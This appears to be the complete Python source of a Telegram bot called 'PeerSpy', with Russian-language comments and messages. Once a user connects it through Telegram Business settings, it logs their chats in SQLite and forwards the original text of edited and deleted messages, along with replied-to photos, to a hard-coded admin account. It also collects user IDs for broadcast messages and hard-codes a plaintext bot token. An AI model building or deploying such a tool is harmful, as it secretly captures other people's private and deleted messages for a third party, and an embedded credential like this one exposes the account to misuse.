import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# --- НАСТРОЙКИ ---
TOKEN = "8758417597:AAERQH3jUuduK8syNtCKW8tvHdZXTilJrF8"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages (msg_id TEXT PRIMARY KEY, user_id TEXT, text TEXT)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, join_date TEXT)''')
    conn.commit()
    conn.close()

# --- ВЕБ-СЕРВЕР ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy System Active"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- БОТ ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
router = Router()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()

# --- ФУНКЦИИ ОБРАБОТКИ ---

async def cmd_start(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", (message.from_user.id, message.from_user.username, str(datetime.now())))
    conn.commit()
    conn.close()
    
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="🚀 Как подключить?", callback_data="help"))
    if message.from_user.id == ADMIN_ID:
        kb.row(types.InlineKeyboardButton(text="⚙️ Админка", callback_data="admin"))
    
    await message.answer(f"👋 <b>PeerSpy v3.8</b>\n\nБизнес-мониторинг активен.", reply_markup=kb.as_markup())

async def biz_msg_handler(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    txt = message.text or message.caption or "[Медиа]"
    
    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
    old = cur.fetchone()
    if old and old[0] != txt:
        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\n\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {txt}")
    
    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (str(message.message_id), str(message.from_user.id), txt))
    conn.commit()
    conn.close()

    if message.reply_to_message and message.reply_to_message.photo:
        f_id = message.reply_to_message.photo[-1].file_id
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as r:
                res = await r.json()
                if res.get("ok"):
                    path = res["result"]["file_path"]
                    async with s.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
                        await bot.send_photo(ADMIN_ID, types.BufferedInputFile(await fr.read(), filename="s.jpg"), caption="📸 <b>Фото спасено!</b>")

async def biz_delete_handler(event: types.BusinessMessagesDeleted):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    for m_id in event.message_ids:
        cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
        res = cur.fetchone()
        if res:
            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n{res[0]}")
    conn.close()

# --- CALLBACKS ---
async def h_cb(c: types.CallbackQuery):
    await c.message.answer("Инструкция: Настройки -> Business -> Чат-боты."); await c.answer()

async def adm_cb(c: types.CallbackQuery):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT COUNT(*) FROM users"); count = cur.fetchone()[0]; conn.close()
    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="bc"))
    await c.message.answer(f"Юзеров: {count}", reply_markup=b.as_markup()); await c.answer()

async def bc_s(c: types.CallbackQuery, state: FSMContext):
    await c.message.answer("Пиши текст:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()

async def bc_f(m: types.Message, state: FSMContext):
    conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
    for u in users:
        try: await bot.send_message(u[0], m.text)
        except: pass
    await m.answer("Готово!"); await state.clear()

# --- РЕГИСТРАЦИЯ ОБРАБОТЧИКОВ ---
router.message.register(cmd_start, Command("start"))
router.business_message.register(biz_msg_handler)
router.business_edited_message.register(biz_msg_handler)
router.business_deleted_messages.register(biz_delete_handler)
router.callback_query.register(h_cb, F.data == "help")
router.callback_query.register(adm_cb, F.data == "admin")
router.callback_query.register(bc_s, F.data == "bc")
router.message.register(bc_f, AdminStates.waiting_for_broadcast)

async def main():
    init_db()
    dp.include_router(router)
    Thread(target=run_web).start()
    print("🚀 БОТ СТАРТОВАЛ!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
